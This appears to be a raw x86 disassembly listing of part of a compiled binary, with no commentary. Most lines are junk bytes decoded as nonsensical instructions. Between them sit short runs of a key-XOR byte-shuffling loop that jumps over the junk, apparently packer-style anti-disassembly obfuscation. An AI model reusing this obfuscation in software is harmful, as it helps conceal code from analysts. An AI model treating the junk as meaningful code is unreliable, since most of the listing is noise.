  406ad3:	inc    ebp
  406ad4:	mov    dl,0x8d
  406ad6:	sahf   
  406ad7:	xchg   edi,eax
  406ad8:	sbb    dh,BYTE PTR [esi]
  406ada:	jae    0x406a70
  406adc:	adc    eax,0x31d0a60e
  406ae1:	sub    esp,DWORD PTR [eax]
  406ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ae4:	fs add dl,ah
  406ae7:	xor    edi,DWORD PTR ss:[ebp-0x6e]
  406aeb:	jnp    0x406aa8
  406aed:	add    eax,DWORD PTR [edx]
  406aef:	fwait
  406af0:	ret    0xfe38
  406af3:	xchg   edx,eax
  406af4:	sub    edx,eax
  406af6:	out    dx,al
  406af7:	cwde   
  406af8:	jae    0x406b72
  406afa:	cmp    BYTE PTR [edx+edx*8+0x72],dh
  406afe:	aaa    
  406aff:	rol    BYTE PTR [edx+edi*4+0x49f30f83],cl
  406b06:	pop    edi
  406b07:	sti    
  406b08:	pushf  
  406b09:	retf   
  406b0a:	cwde   
  406b0b:	mov    al,0xe8
  406b0d:	(bad)  [ecx+0xcac4a80]
  406b13:	and    bh,BYTE PTR [ebx]
  406b15:	test   al,0x9c
  406b17:	lahf   
  406b18:	sbb    DWORD PTR [edx-0x17],esi
  406b1b:	shr    BYTE PTR [edi+0x15],0xb2
  406b1f:	cwde   
  406b20:	and    eax,0x5329e9a0
  406b25:	push   eax
  406b26:	cs sub al,0xf6
  406b29:	(bad)  
  406b2b:	jmp    0xb0ba6aa8
  406b30:	lock cmp DWORD PTR [ebx-0x7526cd79],esp
  406b37:	push   ss
  406b38:	jbe    0x406ba3
  406b3a:	xchg   ebx,eax
  406b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b3c:	push   esi
  406b3d:	out    0x1e,al
  406b3f:	xchg   ecx,eax
  406b40:	lods   eax,DWORD PTR ds:[esi]
  406b41:	jnp    0x406b9d
  406b43:	cmp    eax,0x5bc05c7f
  406b48:	lods   al,BYTE PTR ds:[esi]
  406b49:	sbb    al,0xcd
  406b4b:	sbb    al,0x90
  406b4d:	add    edx,ecx
  406b4f:	jmp    0x406fb2
  406b54:	mov    edx,DWORD PTR [ebp-0x18]
  406b57:	xor    edx,eax
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax-0x43b1fc8c],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406b7e
  406b8f:	(bad)  
  406b90:	push   ebp
  406b91:	push   ds
  406b92:	ja     0x406bd3
  406b94:	outs   dx,DWORD PTR ds:[esi]
  406b95:	xchg   ebp,eax
  406b96:	sub    BYTE PTR ds:0xf870e153,0x1c
  406b9d:	data16 mov al,0x8f
  406ba0:	scas   al,BYTE PTR es:[edi]
  406ba1:	add    BYTE PTR [ebx-0x18dfb26b],bl
  406ba7:	jns    0x406bd2
  406ba9:	stc    
  406baa:	push   0x5deabbcd
  406baf:	sub    ah,BYTE PTR [edi]
  406bb1:	mov    ch,0xbb
  406bb3:	je     0x406c22
  406bb5:	add    DWORD PTR [edx],ecx
  406bb7:	lock clc 
  406bb9:	pusha  
  406bba:	jno    0x406bdf
  406bbc:	(bad)
  406bc0:	mov    edi,cr3
  406bc3:	sbb    al,0xb6
  406bc5:	clc    
  406bc6:	cmp    dh,BYTE PTR [edi]
  406bc8:	cdq    
  406bc9:	cmp    dh,al
  406bcb:	mov    esi,0x79f3e7dc
  406bd1:	push   cs
  406bd2:	xor    al,0xe1
  406bd4:	mov    ds:0x6a9b6b49,eax
  406bd9:	ja     0x406bda
  406bdb:	outs   dx,BYTE PTR ds:[esi]
  406bdc:	xchg   edi,eax
  406bdd:	push   0x19
  406bdf:	lds    ecx,FWORD PTR [eax-0x36539917]
  406be5:	sbb    DWORD PTR [ebp+0x1d],esp
  406be8:	test   al,0xe3
  406bea:	pop    ebx
  406beb:	pop    edi
  406bec:	xor    eax,0xb52e0c81
  406bf1:	(bad)  [ecx-0x258b7811]
  406bf7:	sub    esi,DWORD PTR [eax]
  406bf9:	ins    DWORD PTR es:[edi],dx
  406bfa:	mov    ah,0xde
  406bfc:	scas   al,BYTE PTR es:[edi]
  406bfd:	adc    cl,BYTE PTR [ecx-0x45]
  406c00:	mov    bh,BYTE PTR [edi+0x9]
  406c03:	adc    al,0xed
  406c05:	xlat   BYTE PTR ds:[ebx]
  406c06:	cmp    al,0x31
  406c08:	and    ecx,esp
  406c0a:	(bad)  
  406c0b:	iret   
  406c0c:	or     BYTE PTR [eax],ch
  406c0e:	and    BYTE PTR [ebx],dh
  406c10:	(bad)  
  406c11:	pop    ebx
  406c12:	pop    ebx
  406c13:	mov    ah,0xa9
  406c15:	xor    DWORD PTR [eax-0x3fa96b3],0xffffffc8
  406c1c:	fmul   st,st(3)
  406c1e:	aam    0xff
  406c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c21:	leave  
  406c22:	xchg   esp,eax
  406c23:	cmp    dh,dh
  406c25:	xor    BYTE PTR [edx+0x1c0191cd],cl
  406c2b:	or     bh,cl
  406c2d:	out    0x71,al
  406c2f:	sub    DWORD PTR [ecx-0x3da058fd],0x7680153a
  406c39:	inc    ebp
  406c3a:	pop    es
  406c3b:	outs   dx,DWORD PTR ds:[esi]
  406c3c:	call   0x8795f79c
  406c41:	in     eax,0xf5
  406c43:	lahf   
  406c44:	leave  
  406c45:	or     ah,BYTE PTR [ecx-0x1cadeb60]
  406c4b:	sbb    eax,0x7986ae31
  406c50:	sahf   
  406c51:	hlt    
  406c52:	dec    edi
  406c53:	stc    
  406c54:	cli    
  406c55:	adc    al,0x13
  406c57:	pop    ebp
  406c58:	std    
  406c59:	test   eax,0x4ce94e3
  406c5e:	jbe    0x406c53
  406c60:	loopne 0x406cb6
  406c62:	or     eax,0xdb828a34
  406c67:	inc    ebp
  406c68:	push   edi
  406c69:	push   es
  406c6a:	jns    0x406cd9
  406c6c:	bound  ecx,QWORD PTR [esi]
  406c6e:	mov    ecx,0x17045c89
  406c73:	stos   BYTE PTR es:[edi],al
  406c74:	out    dx,eax
  406c75:	xchg   DWORD PTR [ebx+0x6f9104e0],ebx
  406c7b:	pop    edx
  406c7c:	dec    ebp
  406c7d:	lea    ebp,[ebx]
  406c7f:	out    0x9,al
  406c81:	fsubr  DWORD PTR [edx]
  406c83:	cs retf 
  406c85:	test   DWORD PTR [edi+0xb8e402d],edx
  406c8b:	cld    
  406c8c:	out    dx,eax
  406c8d:	xor    BYTE PTR [edi-0x7efc4cc1],dl
  406c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c94:	cli    
  406c95:	pop    esi
  406c96:	fcom   QWORD PTR [eax-0x3f94968]
  406c9c:	adc    ch,ah
  406c9e:	push   esi
  406c9f:	pop    esp
  406ca0:	mov    ds:0x766ad40e,eax
  406ca5:	(bad)  
  406ca6:	jge    0x406ca0
  406ca8:	aad    0x19
  406caa:	sar    DWORD PTR [esi],1
  406cac:	mov    edx,0xd70a840f
  406cb1:	or     dh,BYTE PTR [edx]
  406cb3:	loopne 0x406cb6
  406cb5:	sahf   
  406cb6:	jo     0x406c86
  406cb8:	in     eax,0xd
  406cba:	pop    ds
  406cbb:	mov    BYTE PTR [esi-0x7fdac8a5],bl
  406cc1:	ja     0x406d3e
  406cc3:	mov    edi,DWORD PTR [ebp-0x1c]
  406cc6:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406ccd:	mov    BYTE PTR [ebp+0xb],dl
  406cd0:	mov    dl,BYTE PTR [ebp+0xf]
  406cd3:	mov    edi,DWORD PTR [ebp-0xc]
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss call 0x7e07:0x94bbcc9a
  406cf6:	jle    0x406d1b
  406cf8:	jg     0x406d78
  406cfa:	jle    0x406d48
  406cfc:	std    
  406cfd:	xchg   ebx,eax
  406cfe:	mov    ebp,0x9e4fee63
  406d03:	or     esi,DWORD PTR ds:[eax]
  406d06:	jp     0x406d4d
  406d08:	mov    cl,0x61
  406d0a:	rol    DWORD PTR [esi],cl
  406d0c:	(bad)  
  406d0d:	fisub  WORD PTR [edx+ebp*2+0x26]
  406d11:	xchg   ebp,ebp
  406d13:	pop    edi
  406d14:	cmp    BYTE PTR [ebx],bl
  406d16:	arpl   cx,sp
  406d18:	jmp    0x4b71e58
  406d1d:	popf   
  406d1e:	xchg   esi,eax
  406d1f:	daa    
  406d20:	fstp   TBYTE PTR [ebp+0x64dac22c]
  406d26:	jp     0x406d57
  406d28:	push   es
  406d29:	sub    bh,BYTE PTR ds:0xba890ee
  406d2f:	and    eax,edx
  406d31:	pop    ebp
  406d32:	test   BYTE PTR [esp+esi*2+0x1e],al
  406d36:	mov    al,0xd3
  406d38:	jb     0x406ce8
  406d3a:	icebp  
  406d3b:	ds mov cl,0x6c
  406d3e:	scas   eax,DWORD PTR es:[edi]
  406d3f:	xchg   edx,eax
  406d40:	xchg   edi,eax
  406d41:	pop    esp
  406d42:	xor    BYTE PTR [ecx-0x5af8c56a],bl
  406d48:	popa   
  406d49:	psrlw  mm1,QWORD PTR [edx]
  406d4c:	sub    dl,BYTE PTR [ecx-0x42]
  406d4f:	mov    bh,0xc2
  406d51:	in     eax,dx
  406d52:	jecxz  0x406d76
  406d54:	push   ebp
  406d55:	cmp    BYTE PTR [eax],0xf5
  406d58:	sahf   
  406d59:	mov    edi,0x3f5d0780
  406d5e:	lods   al,BYTE PTR ds:[esi]
  406d5f:	(bad)  
  406d60:	sbb    ebx,DWORD PTR [esi-0x79]
  406d63:	push   esi
  406d64:	ds loopne 0x406cf8
  406d67:	mov    ds:0x184174d5,eax
  406d6c:	xor    al,BYTE PTR [ecx-0x6d]
  406d6f:	call   0x7a9296c1
  406d74:	call   0xb4dd:0x5aa5ae49
  406d7b:	xchg   ah,bh
  406d7d:	jp     0x406d88
  406d7f:	loop   0x406d0c
  406d81:	or     eax,0x8864ebcd
  406d86:	or     ebx,DWORD PTR [edx+ebp*2+0x70]
  406d8a:	test   DWORD PTR [esi-0x5c941c6a],ebx
  406d90:	add    edx,DWORD PTR [esi+esi*4-0x7a]
  406d94:	and    DWORD PTR [edx+0x63188d95],eax
  406d9a:	mov    esi,0x26fc1144
  406d9f:	and    ch,al
  406da1:	xor    dl,BYTE PTR [ebx+0x6906d5ac]
  406da7:	push   es
  406da8:	sahf   
  406da9:	out    dx,eax
  406daa:	sbb    eax,0xb8300511
  406daf:	in     eax,dx
  406db0:	pop    es
  406db1:	mov    ch,0xd9
  406db3:	icebp  
  406db4:	les    edx,FWORD PTR [edx]
  406db6:	or     eax,0x55c4cafb
  406dbb:	dec    eax
  406dbc:	mov    al,0x6d
  406dbe:	fs fs mov ah,0x1a
  406dc2:	mov    ebx,0x67ffb57e
  406dc7:	cmp    al,0x93
  406dc9:	push   ecx
  406dca:	scas   eax,DWORD PTR es:[edi]
  406dcb:	inc    ebx
  406dcc:	cmc    
  406dcd:	lods   al,BYTE PTR ds:[esi]
  406dce:	in     eax,dx
  406dcf:	shl    DWORD PTR [esi],cl
  406dd1:	xlat   BYTE PTR ds:[ebx]
  406dd2:	icebp  
  406dd3:	les    ecx,FWORD PTR [ecx+0x5a4febba]
  406dd9:	scas   al,BYTE PTR es:[edi]
  406dda:	adc    DWORD PTR [ebp+0x7],edx
  406ddd:	jnp    0x406dfe
  406ddf:	loopne 0x406df2
  406de1:	icebp  
  406de2:	test   BYTE PTR [esi-0x79],bl
  406de5:	adc    al,0xf0
  406de7:	pushf  
  406de8:	mov    al,0x43
  406dea:	push   esi
  406deb:	pop    ss
  406dec:	jb     0x406df7
  406dee:	gs jp  0x406e47
  406df1:	lahf   
  406df2:	dec    ebx
  406df3:	je     0x406dba
  406df5:	jmp    0x62a1c811
  406dfa:	es push eax
  406dfc:	push   edx
  406dfd:	xor    edx,DWORD PTR [ecx+0x6]
  406e00:	out    0x5e,eax
  406e02:	out    0x15,al
  406e04:	addr16 jmp 0x406e65
  406e07:	fwait
  406e08:	lea    ecx,[ebp+0x25688713]
  406e0e:	dec    ebx
  406e0f:	or     DWORD PTR [esp+ebp*4+0x5f],edi
  406e13:	mov    ecx,0x4c7f106c
  406e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e19:	add    bl,al
  406e1b:	outs   dx,DWORD PTR ds:[esi]
  406e1c:	push   cs
  406e1d:	addr16 clc 
  406e1f:	loope  0x406e68
  406e21:	retf   0xdd07
  406e24:	(bad)
  406e28:	in     eax,0x9b
  406e2a:	mov    eax,ds:0x81f9a96a
  406e2f:	ins    DWORD PTR es:[edi],dx
  406e30:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406e37:	jmp    0x406f89
  406e3c:	jns    0x406e62
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	imul   edx,DWORD PTR [ebx],0x45909be
  406e4e:	jle    0x406ece
  406e50:	and    edi,DWORD PTR [edi+0x7e]
  406e53:	jle    0x406eb0
  406e55:	out    dx,al
  406e56:	jle    0x406ddd
  406e58:	sbb    BYTE PTR [ebx+0x5e9034bf],0x87
  406e5f:	add    DWORD PTR fs:[ebx-0x69fef1e1],edi
  406e66:	mov    eax,0x7b825181
  406e6b:	cli    
  406e6c:	push   esi
  406e6d:	std    
  406e6e:	xchg   edx,eax
  406e6f:	xor    dh,ch
  406e71:	sub    al,0x58
  406e73:	jp     0x406e3b
  406e75:	fwait
  406e76:	hlt    
  406e77:	pop    es
  406e78:	mov    dl,0x96
  406e7a:	add    eax,0xf016f43
  406e7f:	inc    eax
  406e80:	jne    0x406e4c
  406e82:	xchg   esp,eax
  406e83:	and    DWORD PTR [edx],edi
  406e85:	retf   0x3c85
  406e88:	scas   eax,DWORD PTR es:[edi]
  406e89:	pop    esi
  406e8a:	add    BYTE PTR [ecx],0x1e
  406e8d:	xchg   ebx,eax
  406e8e:	add    bl,BYTE PTR [edx]
  406e90:	pushf  
  406e91:	pop    esp
  406e92:	lock mov ecx,0x13217686
  406e98:	mov    ch,0x5
  406e9a:	cmp    al,BYTE PTR [ebx+0x41]
  406e9d:	sub    DWORD PTR [esi-0x4da28ef7],ecx
  406ea3:	fldcw  WORD PTR [ecx+ecx*8+0x3c]
  406ea7:	cmc    
  406ea8:	in     al,0x9f
  406eaa:	push   esp
  406eab:	nop
  406eac:	push   ecx
  406ead:	scas   eax,DWORD PTR es:[edi]
  406eae:	pop    esp
  406eaf:	sub    eax,0x761ef17e
  406eb4:	adc    al,0x9f
  406eb6:	test   BYTE PTR [ebx-0x38],dl
  406eb9:	cmp    BYTE PTR [eax-0x33ce3b9],al
  406ebf:	ficomp DWORD PTR [eax+0x69a6b4a4]
  406ec5:	adc    eax,0xf6178e37
  406eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ecb:	shr    BYTE PTR [edx-0x5b6ce4be],0x1b
  406ed2:	(bad)  
  406ed3:	push   ds
  406ed4:	sbb    ch,bh
  406ed6:	mov    dl,0x79
  406ed8:	ret    0xf2bf
  406edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406edc:	jecxz  0x406e7f
  406ede:	mov    dl,BYTE PTR [ecx-0x57]
  406ee1:	jne    0x406e9f
  406ee3:	sub    dh,0xaf
  406ee6:	or     eax,0xe9cb9904
  406eeb:	sub    esi,DWORD PTR [esi]
  406eed:	and    BYTE PTR ds:[edx],ch
  406ef0:	add    bl,dh
  406ef2:	inc    edi
  406ef3:	mov    DWORD PTR [edx+0x42],eax
  406ef6:	imul   ebx,DWORD PTR [ecx-0x24],0xcd2a94cd
  406efd:	out    0xf5,eax
  406eff:	xchg   dh,cl
  406f01:	clc    
  406f02:	out    0x9e,al
  406f04:	add    eax,0x98969ebe
  406f09:	or     al,0xd9
  406f0b:	jno    0x406eac
  406f0d:	cwde   
  406f0e:	inc    ebp
  406f0f:	mov    ds:0x1971d7,eax
  406f14:	pop    ss
  406f15:	or     DWORD PTR [ebp-0x2a],eax
  406f18:	inc    ecx
  406f19:	iret   
  406f1a:	add    eax,DWORD PTR [esi+0x31]
  406f1d:	fsubrp st(1),st
  406f1f:	aas    
  406f20:	sub    eax,DWORD PTR [edi]
  406f22:	xchg   ebp,eax
  406f23:	out    dx,al
  406f24:	cmp    al,0xa8
  406f26:	cwde   
  406f27:	pop    edx
  406f28:	sbb    eax,0x6bded33b
  406f2d:	cld    
  406f2e:	xor    al,0x65
  406f30:	pop    edx
  406f31:	int    0x5b
  406f33:	sub    BYTE PTR ds:0xe8134964,ch
  406f39:	jecxz  0x406faf
  406f3b:	stc    
  406f3c:	stos   BYTE PTR es:[edi],al
  406f3d:	cmp    al,0x7b
  406f3f:	scas   eax,DWORD PTR es:[edi]
  406f40:	mov    edx,0xfaf721fb
  406f45:	cmp    ebx,DWORD PTR cs:[esi+eax*4+0x5b]
  406f4a:	ds xchg ebx,eax
  406f4c:	xchg   ecx,eax
  406f4d:	pop    edx
  406f4e:	mov    edx,0xca0284a7
  406f53:	push   edi
  406f54:	xchg   esp,eax
  406f55:	mov    eax,0x97bc8318
  406f5a:	xor    DWORD PTR [ebp+0x55c7c9b5],ecx
  406f60:	sbb    BYTE PTR [esi+ecx*1],dl
  406f63:	fimul  DWORD PTR [edi]
  406f65:	mov    ebx,eax
  406f67:	sbb    ah,cl
  406f69:	retf   
  406f6a:	imul   esp,DWORD PTR [ecx-0x6a987ded],0x2e
  406f71:	ds iret 
  406f73:	xchg   ecx,edi
  406f75:	aam    0x8d
  406f77:	jmp    0x7de84b08
  406f7c:	ja     0x406fbc
  406f7e:	xchg   edi,eax
  406f7f:	add    DWORD PTR [ecx-0x44c29e8f],esp
  406f85:	and    DWORD PTR fs:[esi-0x20],ebp
  406f89:	mov    dl,BYTE PTR [ebp+0xb]
  406f8c:	mov    edi,DWORD PTR [ebp-0x18]
  406f8f:	xor    edi,eax
  406f91:	add    edi,DWORD PTR [ebp-0x14]
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	sub    BYTE PTR [edi+0x1a027a9a],cl
  407015:	jle    0x407095
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x406fa3
  40701c:	push   eax
  40701d:	ins    BYTE PTR es:[edi],dx
  40701e:	leave  
  40701f:	outs   dx,BYTE PTR ds:[esi]
  407020:	fwait
  407021:	xchg   edi,eax
  407022:	adc    DWORD PTR [edi-0x2af381ef],0xd3962983
  40702c:	loopne 0x40702a
  40702e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  407030:	pop    esp
  407031:	pop    ecx
  407032:	add    BYTE PTR [esi+0x14],al
  407035:	or     edx,ebx
  407037:	sbb    ebx,0x6a
  40703a:	push   ss
  40703b:	repnz pop edx
  40703d:	pop    ds
  40703e:	xchg   edi,eax
  40703f:	mov    ebx,0x2e677294
  407044:	or     BYTE PTR [edi+0x24],0xeb
  407048:	hlt    
  407049:	jle    0x407056
  40704b:	jb     0x406fcd
  40704d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40704e:	mov    BYTE PTR [edx-0x3e],bl
  407051:	add    al,0xf
  407053:	and    BYTE PTR [eax],bl
  407055:	outs   dx,BYTE PTR ds:[esi]
  407056:	xchg   edi,eax
  407057:	aas    
  407058:	(bad)  
  40705a:	push   0x7e
  40705c:	lea    ebp,[esi-0x7e]
  40705f:	and    eax,0x9555a137
  407064:	in     al,0x35
  407066:	mov    dh,0x49
  407068:	das    
  407069:	into   
  40706a:	mov    bl,BYTE PTR [ecx]
  40706c:	icebp  
  40706d:	mov    al,0xf5
  40706f:	mov    eax,0xdc840277
  407074:	sub    BYTE PTR [edx+0x25eb84c6],ah
  40707a:	jo     0x407013
  40707c:	mov    ebx,0x85be5788
  407081:	fcmovnbe st,st(0)
  407083:	push   ss
  407084:	ja     0x4070e7
  407086:	lods   al,BYTE PTR ds:[esi]
  407087:	xlat   BYTE PTR ds:[ebx]
  407088:	arpl   WORD PTR [edi],di
  40708a:	dec    esp
  40708b:	cld    
  40708c:	aam    0x99
  40708e:	(bad)  
  40708f:	jnp    0x4070ff
  407091:	dec    al
  407093:	or     eax,0x27b31966
  407098:	jne    0x40701e
  40709a:	call   0xe9da0676
  40709f:	or     dh,dl
  4070a1:	mov    cl,0x1c
  4070a3:	data16 idiv BYTE PTR [esi]
  4070a6:	and    edx,DWORD PTR [edi+0x7d]
  4070a9:	inc    edi
  4070aa:	mov    ebp,0x4cbb2b7c
  4070b0:	mov    edx,eax
  4070b2:	adc    eax,0x28f4e28
  4070b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070b8:	adc    ecx,ebx
  4070ba:	stos   DWORD PTR es:[edi],eax
  4070bb:	loope  0x4070c3
  4070bd:	js     0x40704e
  4070bf:	xor    eax,0x44581f48
  4070c4:	jg     0x4070f4
  4070c6:	xchg   ebx,eax
  4070c7:	fadd   st,st(7)
  4070c9:	daa    
  4070ca:	inc    esi
  4070cb:	test   DWORD PTR [eax+0x4c4a3a21],esp
  4070d1:	pop    ss
  4070d2:	loop   0x407127
  4070d4:	jecxz  0x4070f5
  4070d6:	xor    ebx,ebp
  4070d8:	jmp    0x407145
  4070da:	ds stc 
  4070dc:	jmp    0x4070f1
  4070de:	test   BYTE PTR ds:0x3b0b1688,ah
  4070e4:	mov    eax,ds:0xb705b488
  4070e9:	and    bh,BYTE PTR [eax+eiz*8]
  4070ec:	nop
  4070ed:	into   
  4070ee:	mov    ebx,0x568db55f
  4070f3:	xchg   ecx,eax
  4070f4:	add    al,0x98
  4070f6:	sbb    ah,BYTE PTR [ebp-0x283ed86a]
  4070fc:	js     0x4070da
  4070fe:	dec    eax
  4070ff:	faddp  st(5),st
  407101:	pop    ebp
  407102:	jecxz  0x4070b1
  407104:	(bad)  
  407106:	mov    dl,BYTE PTR [edi]
  407108:	pop    ebx
  407109:	sub    DWORD PTR [eax+0xd],0x58a1d188
  407110:	lahf   
  407111:	mov    al,ds:0xbd17c528
  407116:	fisubr WORD PTR [ecx]
  407118:	mov    edx,0xd6a92086
  40711d:	and    al,0xf9
  40711f:	pop    ss
  407120:	sahf   
  407121:	xlat   BYTE PTR ds:[ebx]
  407122:	cli    
  407123:	add    eax,0x855722b4
  407128:	dec    edi
  407129:	cmovp  eax,DWORD PTR [ebp+0x58450d63]
  407130:	test   eax,0x1f69d2b5
  407135:	push   edx
  407136:	lods   eax,DWORD PTR ds:[esi]
  407137:	cld    
  407138:	push   eax
  407139:	repnz lahf 
  40713b:	cld    
  40713c:	repnz div DWORD PTR [eax-0x2b]
  407140:	mov    ecx,0x9eb50bc9
  407145:	pop    esi
  407146:	push   edx
  407147:	sub    eax,0xe5f5c2af
  40714c:	push   ebp
  40714d:	popa   
  40714e:	inc    edi
  40714f:	adc    BYTE PTR [ebx],al
  407151:	xlat   BYTE PTR ds:[ebx]
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0x34
  407180:	je     0x4071d6
  407182:	push   ebx
  407183:	aaa    
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x407126
  40718c:	lea    ebx,[ebx-0x7b]
  40718f:	mov    DWORD PTR [esi],edi
  407191:	ret    0xad51
  407194:	cmp    al,0xe6
  407196:	jns    0x4071ed
  407198:	enter  0x9f7,0x2e
  40719c:	rcl    dl,cl
  40719e:	gs cld 
  4071a0:	lods   al,BYTE PTR ds:[esi]
  4071a1:	push   edx
  4071a2:	sbb    DWORD PTR [edi+ebp*2-0x165400f1],eax
  4071a9:	inc    ebp
  4071aa:	fs dec esi
  4071ac:	out    0xe1,eax
  4071ae:	xor    eax,0x6c12e6a4
  4071b3:	pop    es
  4071b4:	arpl   WORD PTR [ecx+0x31],ax
  4071b7:	test   ebp,edx
  4071b9:	aaa    
  4071ba:	scas   al,BYTE PTR es:[edi]
  4071bb:	stos   DWORD PTR es:[edi],eax
  4071bc:	mov    cl,0xeb
  4071be:	out    dx,eax
  4071bf:	xor    bh,ah
  4071c1:	mov    WORD PTR [eax-0x4d],cs
  4071c4:	mov    ebx,0x4f9538fe
  4071c9:	pushf  
  4071ca:	jne    0x407175
  4071cc:	fisubr DWORD PTR [edx-0x4d]
  4071cf:	mov    ebp,0x4f7a7aca
  4071d4:	fadd   DWORD PTR [ecx-0x3c]
  4071d7:	cld    
  4071d8:	dec    ebp
  4071d9:	pop    esp
  4071da:	or     DWORD PTR [esi-0x3b],eax
  4071dd:	call   0x22e412cd
  4071e2:	xchg   edx,eax
  4071e3:	push   eax
  4071e4:	sti    
  4071e5:	push   edi
  4071e6:	jne    0x4071a9
  4071e8:	sub    DWORD PTR [ecx],0x70
  4071eb:	mov    dl,0xde
  4071ed:	xor    eax,0xb217d05
  4071f2:	iret   
  4071f3:	cs mov ebx,0x287402f1
  4071f9:	mov    esp,0x4abb1a27
  4071fe:	mov    dh,0x24
  407200:	inc    ecx
  407201:	xchg   edx,eax
  407202:	inc    edx
  407203:	mov    ah,0xa5
  407205:	shl    al,0xb2
  407208:	clc    
  407209:	add    ecx,DWORD PTR [edx]
  40720b:	mov    ds:0x31809d2e,eax
  407210:	mov    esp,0x95a215a
  407215:	fs push edi
  407217:	stos   BYTE PTR es:[edi],al
  407218:	jb     0x4071f4
  40721a:	mov    ebx,0x8d45067
  40721f:	fild   DWORD PTR [esi]
  407221:	mov    dh,0xf8
  407223:	push   0xa3f972f3
  407228:	mov    edi,0x849f3a89
  40722d:	(bad)  
  40722e:	push   esi
  40722f:	mov    eax,0x341df40e
  407234:	sub    ah,dh
  407236:	sbb    edi,DWORD PTR ds:0xf9f9d8da
  40723c:	push   edx
  40723d:	push   edi
  40723e:	mov    esi,0x41a8cf2a
  407243:	ins    BYTE PTR es:[edi],dx
  407244:	scas   al,BYTE PTR es:[edi]
  407245:	sub    DWORD PTR ds:0xb8be6a06,eax
  40724b:	ror    BYTE PTR [ebp+0x10152bfd],0x4b
  407252:	inc    edi
  407253:	mov    esp,0xcab9564d
  407258:	lahf   
  407259:	rol    DWORD PTR [esi+0x4ea76fda],0xf6
  407260:	jnp    0x40729b
  407262:	imul   edi,DWORD PTR [ecx+0x2d],0xffffffff
  407266:	ror    BYTE PTR [esi+edx*8],0x46
  40726a:	in     al,0x3
  40726c:	pop    ss
  40726d:	out    0x44,eax
